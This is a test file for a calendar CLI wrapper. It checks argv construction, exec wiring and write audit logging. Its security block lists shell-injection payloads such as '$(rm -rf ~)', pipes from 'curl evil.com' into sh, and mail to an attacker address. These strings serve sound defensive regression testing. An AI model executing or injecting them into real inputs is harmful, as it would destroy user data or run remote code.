import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { join } from "path";
import { mkdtempSync, readFileSync, rmSync } from "fs";
import { tmpdir } from "os";
import {
  resolveKayaCliPath,
  buildAgendaArgs,
  buildAddEventArgs,
  buildDeleteEventArgs,
  agenda,
  addEvent,
  deleteEvent,
} from "./GcalCli.ts";
import { getKayaHome } from "./KayaHome.ts";

// ============================================================================
// resolveKayaCliPath — repo-canonical resolution (was hardcoded per call site)
// ============================================================================

describe("resolveKayaCliPath", () => {
  const originalKayaHome = process.env.KAYA_HOME;
  const originalKayaDir = process.env.KAYA_DIR;

  beforeEach(() => {
    delete process.env.KAYA_HOME;
    delete process.env.KAYA_DIR;
  });

  afterEach(() => {
    if (originalKayaHome !== undefined) process.env.KAYA_HOME = originalKayaHome;
    else delete process.env.KAYA_HOME;
    if (originalKayaDir !== undefined) process.env.KAYA_DIR = originalKayaDir;
    else delete process.env.KAYA_DIR;
  });

  it("resolves to <KAYA_HOME>/bin/kaya-cli using getKayaHome()", () => {
    expect(resolveKayaCliPath()).toBe(join(getKayaHome(), "bin", "kaya-cli"));
  });

  it("honors a KAYA_HOME override (no hardcoded /Users/[user] path)", () => {
    process.env.KAYA_HOME = "/tmp/alt-kaya-home";
    expect(resolveKayaCliPath()).toBe("/tmp/alt-kaya-home/bin/kaya-cli");
  });
});

// ============================================================================
// Pure argv builders — exact argv shape must match the pre-S14 call sites
// ============================================================================

describe("buildAgendaArgs", () => {
  it("matches CalendarBlock.ts's pre-S14 shell command shape", () => {
    const args = buildAgendaArgs("today", "tomorrow", {
      calendars: ["[user]@gmail.com", "[user-email]"],
    });
    expect(args).toEqual([
      "--calendar", "[user]@gmail.com",
      "--calendar", "[user-email]",
      "agenda", "today", "tomorrow",
      "--nocolor",
    ]);
  });

  it("omits --nocolor when nocolor: false", () => {
    const args = buildAgendaArgs("today", "tomorrow", { nocolor: false });
    expect(args).not.toContain("--nocolor");
  });

  it("omits --calendar flags when no calendars given", () => {
    const args = buildAgendaArgs("today", "tomorrow");
    expect(args).toEqual(["agenda", "today", "tomorrow", "--nocolor"]);
  });
});

describe("buildAddEventArgs", () => {
  it("matches EventScout Actions.ts's addToCalendar shape (with where/description)", () => {
    const args = buildAddEventArgs({
      calendar: "[user-email]",
      title: "Tycho at Observatory",
      when: "2026-06-08 21:00",
      duration: 120,
      where: "2891 University Ave",
      description: "why-line\nhttps://tickets.example.com",
    });
    expect(args).toEqual([
      "add", "--noprompt",
      "--calendar", "[user-email]",
      "--title", "Tycho at Observatory",
      "--when", "2026-06-08 21:00",
      "--duration", "120",
      "--where", "2891 University Ave",
      "--description", "why-line\nhttps://tickets.example.com",
    ]);
  });

  it("matches LifeOS Router.ts's planDecision/planCalendar shape (no where/description)", () => {
    const args = buildAddEventArgs({
      calendar: "[user-email]",
      title: "Decision review: Alphatec vs Zywave",
      when: "2027-01-03 09:00",
      duration: 30,
    });
    expect(args).toEqual([
      "add", "--noprompt",
      "--calendar", "[user-email]",
      "--title", "Decision review: Alphatec vs Zywave",
      "--when", "2027-01-03 09:00",
      "--duration", "30",
    ]);
  });

  it("omits --noprompt when noprompt: false", () => {
    const args = buildAddEventArgs({
      calendar: "c", title: "t", when: "w", duration: 10, noprompt: false,
    });
    expect(args).not.toContain("--noprompt");
  });
});

describe("buildDeleteEventArgs", () => {
  it("matches EventScout Actions.ts's deleteCalendarEvent shape", () => {
    const args = buildDeleteEventArgs({
      text: "Tycho at Observatory North Park",
      startDate: "2026-06-08",
      endDate: "2026-06-09",
      calendar: "[user-email]",
    });
    expect(args).toEqual([
      "delete", "Tycho at Observatory North Park", "2026-06-08", "2026-06-09",
      "--calendar", "[user-email]",
      "--iamaexpert",
    ]);
  });

  it("omits --iamaexpert when iamaexpert: false", () => {
    const args = buildDeleteEventArgs({
      text: "t", startDate: "2026-01-01", endDate: "2026-01-02", calendar: "c", iamaexpert: false,
    });
    expect(args).not.toContain("--iamaexpert");
  });
});

// ============================================================================
// Runtime wrappers — dependency-injected exec captures (file, argv)
// ============================================================================

describe("agenda() / addEvent() / deleteEvent() — exec wiring", () => {
  // addEvent()/deleteEvent() now always call logCalendarWrite() (S5) — every
  // test below MUST pass a logPath override into an isolated temp dir, or it
  // silently writes a real line into the LIVE
  // skills/Productivity/CalendarAssistant/Data/calendar-writes.jsonl via
  // defaultCalendarWriteLogPath()'s no-override fallback. Discovered live
  // during this slice's own verification (test-pollution incident, fixed in
  // the same commit).
  let logDir: string;
  let logPath: string;

  beforeEach(() => {
    logDir = mkdtempSync(join(tmpdir(), "gcalcli-exec-wiring-test-"));
    logPath = join(logDir, "calendar-writes.jsonl");
  });

  afterEach(() => {
    rmSync(logDir, { recursive: true, force: true });
  });

  it("agenda() invokes kayaCliPath with ['gcal', ...buildAgendaArgs] and returns stdout", () => {
    let captured: { file: string; args: string[] } | null = null;
    const stdout = agenda("today", "tomorrow", {
      calendars: ["a@b.com"],
      kayaCliPath: "/fake/kaya-cli",
      execImpl: (file, args) => {
        captured = { file, args };
        return "[]";
      },
    });
    expect(stdout).toBe("[]");
    expect(captured).not.toBeNull();
    expect(captured!.file).toBe("/fake/kaya-cli");
    expect(captured!.args).toEqual([
      "gcal", "--calendar", "a@b.com", "agenda", "today", "tomorrow", "--nocolor",
    ]);
  });

  it("addEvent() invokes kayaCliPath with ['gcal', ...buildAddEventArgs]", () => {
    let captured: { file: string; args: string[] } | null = null;
    addEvent({
      calendar: "c@x.com", title: "T", when: "2026-01-01 10:00", duration: 60,
      kayaCliPath: "/fake/kaya-cli",
      logPath,
      execImpl: (file, args) => { captured = { file, args }; return ""; },
    });
    expect(captured!.file).toBe("/fake/kaya-cli");
    expect(captured!.args).toEqual([
      "gcal", "add", "--noprompt", "--calendar", "c@x.com",
      "--title", "T", "--when", "2026-01-01 10:00", "--duration", "60",
    ]);
  });

  it("deleteEvent() invokes kayaCliPath with ['gcal', ...buildDeleteEventArgs]", () => {
    let captured: { file: string; args: string[] } | null = null;
    deleteEvent({
      text: "T", startDate: "2026-01-01", endDate: "2026-01-02", calendar: "c@x.com",
      kayaCliPath: "/fake/kaya-cli",
      logPath,
      execImpl: (file, args) => { captured = { file, args }; return ""; },
    });
    expect(captured!.file).toBe("/fake/kaya-cli");
    expect(captured!.args).toEqual([
      "gcal", "delete", "T", "2026-01-01", "2026-01-02", "--calendar", "c@x.com", "--iamaexpert",
    ]);
  });

  it("propagates exec failures (callers rely on this for their existing try/catch fallbacks)", () => {
    expect(() =>
      addEvent({
        calendar: "c", title: "t", when: "w", duration: 10,
        logPath,
        execImpl: () => { throw new Error("gcalcli: boom"); },
      })
    ).toThrow("gcalcli: boom");
  });
});

// ============================================================================
// SECURITY REGRESSION — hostile strings must reach gcalcli as inert literal
// argv elements, never interpreted by a shell. This is the actual bug being
// fixed: the pre-S14 code built shell command STRINGS (JSON.stringify(s) is
// shell-quoting, but bash still expands $(...) / backticks inside double
// quotes) and ran them via execSync. There is no `sh -c` in this module —
// execFileSync spawns the binary directly with an argv array.
// ============================================================================

describe("SECURITY: hostile strings pass through as literal argv (no shell)", () => {
  // See the "exec wiring" describe block above — addEvent() below must get an
  // isolated logPath or it writes a real line to the LIVE calendar-writes.jsonl.
  let secLogDir: string;
  let secLogPath: string;

  beforeEach(() => {
    secLogDir = mkdtempSync(join(tmpdir(), "gcalcli-security-test-"));
    secLogPath = join(secLogDir, "calendar-writes.jsonl");
  });

  afterEach(() => {
    rmSync(secLogDir, { recursive: true, force: true });
  });

  const HOSTILE_PAYLOADS = [
    "$(rm -rf ~)",
    "`rm -rf ~`",
    "title; rm -rf ~ #",
    '" && curl evil.com | sh && "',
    "'; DROP TABLE events; --",
    "$(curl -s evil.com/x.sh | sh)",
    "title && echo pwned",
    "title | mail attacker@evil.com",
  ];

  for (const payload of HOSTILE_PAYLOADS) {
    it(`buildAddEventArgs: hostile title ${JSON.stringify(payload)} is one untouched argv element`, () => {
      const args = buildAddEventArgs({
        calendar: "c@x.com", title: payload, when: "2026-01-01 10:00", duration: 60,
      });
      // The hostile string must appear VERBATIM as exactly one array element —
      // proof the shell never got a chance to tokenize/expand it.
      expect(args).toContain(payload);
      const titleIdx = args.indexOf("--title") + 1;
      expect(args[titleIdx]).toBe(payload);
    });

    it(`buildDeleteEventArgs: hostile text ${JSON.stringify(payload)} is one untouched argv element`, () => {
      const args = buildDeleteEventArgs({
        text: payload, startDate: "2026-01-01", endDate: "2026-01-02", calendar: "c@x.com",
      });
      expect(args[1]).toBe(payload);
    });

    it(`buildAgendaArgs: hostile calendar ${JSON.stringify(payload)} is one untouched argv element`, () => {
      const args = buildAgendaArgs("today", "tomorrow", { calendars: [payload] });
      const calIdx = args.indexOf("--calendar") + 1;
      expect(args[calIdx]).toBe(payload);
    });

    it(`addEvent(): hostile description ${JSON.stringify(payload)} reaches the fake exec as one literal argv element`, () => {
      let captured: string[] | null = null;
      addEvent({
        calendar: "c@x.com", title: "safe title", when: "2026-01-01 10:00", duration: 60,
        description: payload,
        logPath: secLogPath,
        execImpl: (_file, args) => { captured = args; return ""; },
      });
      expect(captured).not.toBeNull();
      // No element of argv should differ from the raw payload by virtue of shell
      // expansion (e.g. "$(rm -rf ~)" becoming the output of `rm -rf ~`).
      expect(captured).toContain(payload);
      const descIdx = captured!.indexOf("--description") + 1;
      expect(captured![descIdx]).toBe(payload);
    });
  }
});

// ============================================================================
// WRITE AUDIT LOGGING (calassist-overhaul-20260702, S5) — addEvent()/deleteEvent()
// funnel into the same shared lib/core/CalendarWriteLog.ts seam that
// GoogleCalendarAdapter.ts's createEvent/deleteEvent use, so EventScout/LifeOS
// primary-calendar writes are auditable too (one log, two write code paths —
// see CalendarWriteLog.ts's module docstring). Every write attempt (success or
// failure) is recorded; logging never blocks the throw/return contract callers
// already rely on.
// ============================================================================

describe("addEvent() / deleteEvent() — write audit logging (S5)", () => {
  let dir: string;
  let logPath: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "gcalcli-write-log-test-"));
    logPath = join(dir, "calendar-writes.jsonl");
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("addEvent() logs target/caller/title/outcome:success on a successful write", () => {
    addEvent({
      calendar: "[user-email]",
      title: "Tycho at Observatory",
      when: "2026-06-08 21:00",
      duration: 120,
      caller: "EventScout.Actions.addToCalendar",
      logPath,
      execImpl: () => "",
    });
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.target).toBe("[user-email]");
    expect(entry.caller).toBe("EventScout.Actions.addToCalendar");
    expect(entry.title).toBe("Tycho at Observatory");
    expect(entry.outcome).toBe("success");
    expect(typeof entry.timestamp).toBe("string");
  });

  it("addEvent() defaults caller to \"unknown\" when omitted — always log SOMETHING", () => {
    addEvent({
      calendar: "[user-email]",
      title: "T",
      when: "2026-01-01 10:00",
      duration: 30,
      logPath,
      execImpl: () => "",
    });
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.caller).toBe("unknown");
  });

  it("addEvent() logs outcome starting with \"error:\" AND still throws on exec failure — logging must never swallow the error", () => {
    let threw = false;
    try {
      addEvent({
        calendar: "[user-email]",
        title: "T",
        when: "2026-01-01 10:00",
        duration: 30,
        caller: "test.caller",
        logPath,
        execImpl: () => { throw new Error("gcalcli: boom"); },
      });
    } catch (err) {
      threw = true;
      expect((err as Error).message).toContain("gcalcli: boom");
    }
    expect(threw).toBe(true);
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.outcome).toContain("error:");
    expect(entry.outcome).toContain("gcalcli: boom");
  });

  it("deleteEvent() logs target/caller/title(=text)/outcome:success on a successful delete", () => {
    deleteEvent({
      text: "Tycho at Observatory",
      startDate: "2026-06-08",
      endDate: "2026-06-09",
      calendar: "[user-email]",
      caller: "EventScout.Actions.deleteCalendarEvent",
      logPath,
      execImpl: () => "",
    });
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.target).toBe("[user-email]");
    expect(entry.caller).toBe("EventScout.Actions.deleteCalendarEvent");
    expect(entry.title).toBe("Tycho at Observatory");
    expect(entry.outcome).toBe("success");
  });

  it("deleteEvent() logs outcome starting with \"error:\" AND still throws on exec failure", () => {
    let threw = false;
    try {
      deleteEvent({
        text: "T", startDate: "2026-01-01", endDate: "2026-01-02", calendar: "c@x.com",
        caller: "test.caller",
        logPath,
        execImpl: () => { throw new Error("gcalcli: delete boom"); },
      });
    } catch {
      threw = true;
    }
    expect(threw).toBe(true);
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.outcome).toContain("error:");
    expect(entry.outcome).toContain("gcalcli: delete boom");
  });

  it("never logs to the LIVE calendar-writes.jsonl during tests — logPath override is honored (no default-path fallback when set)", () => {
    addEvent({
      calendar: "c", title: "t", when: "w", duration: 10,
      logPath,
      execImpl: () => "",
    });
    // Only our temp-dir log should have content; asserting the temp file exists
    // with exactly one line is the regression guard against silently falling
    // back to defaultCalendarWriteLogPath() and polluting the live tree.
    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines).toHaveLength(1);
  });
});
